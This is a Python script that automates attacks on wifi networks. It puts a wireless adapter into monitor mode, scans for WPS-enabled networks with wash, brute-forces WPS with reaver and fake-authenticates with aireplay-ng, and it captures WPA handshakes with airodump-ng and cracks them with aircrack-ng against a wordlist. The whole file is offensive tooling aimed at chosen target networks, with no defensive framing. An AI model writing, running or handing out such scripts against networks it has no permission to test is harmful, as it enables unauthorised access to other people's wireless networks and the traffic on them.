#!/usr/bin/env python
"""Modules"""
import subprocess
import re

"""variables"""
adapter = input("[+] Input wifi adapter or wireless card: ")


def monitor_mode(interface): 
    '''enable monitor mode '''
    print(f'changing {interface} to monitor mode')
    subprocess.call(['ifconfig', interface, 'down'])
    subprocess.call(['iwconfig', interface, 'mode', 'monitor'])
    subprocess.call(['ifconfig', interface, 'up'])

def check_wps(interface): 
    """Check for Wps enabled"""
    print(f"using {interface} to check for wps")
    subprocess.call(['wash', '--interface', interface])

def wps_vunerability(adapter): 
    """capture handshake"""
    print("print capturing handshake")
    wifi_mac = input("[+] Input wifi mac address: ")
    result = subprocess.check_output(["ifconfig", adapter], encoding='utf8')
    output = re.search(r"([A-Za-z0-9]+(-[A-Za-z0-9]+)+)", result )
    print(output[0])
    adapter_mac = input("[+] Input adapter mac: ")
    channel = input("[+] Input Channel of Wifi Network: ")
    subprocess.call(['reaver', '--bssid', wifi_mac,'--channel', channel, '--interface', adapter, '-vvv', '--no-associate'])
    subprocess.call(['aireplay-ng','-1', '30', '-a', wifi_mac, '-h', adapter_mac, adapter])

def handshake(adapter):
    """wpa handshake"""
    try:
        print("[+] Press Control + C to stop scan")
        subprocess.call(['airodump-ng', adapter])
    except KeyboardInterrupt:
        wifi_bssid = input("[+] Input BSSID of wifi: ") 
        channel = input("[+] Input wifi_channel: ")
        handshake_file = input("enter name of handshake file: ")
        subprocess.call(['airodump-ng', '--bssid', wifi_bssid, '--channel', channel, '--write', handshake_file, adapter])

def wordlist_attacK():
    handshake_file = input("[+] Input Handshake File Name: ")
    wordlist_file = input("[+] Input Wordlist File: ")
    subprocess.call(['aircrack-ng', handshake_file, '-w', wordlist_file])


user_selection = input("[+] Which Vunerability do you want to run: \n 1. WPS \n 2. Wordlist Attack \n Selection: ")

if user_selection == '1':
    try:
        monitor_mode(adapter)
        check_wps(adapter)
    except KeyboardInterrupt:
        pass

    wps_vunerability(adapter)
elif  user_selection == '2':
    try: 
        handshake(adapter)
    except KeyboardInterrupt:
        print("Running Wordlist attack")
        wordlist_attacK()



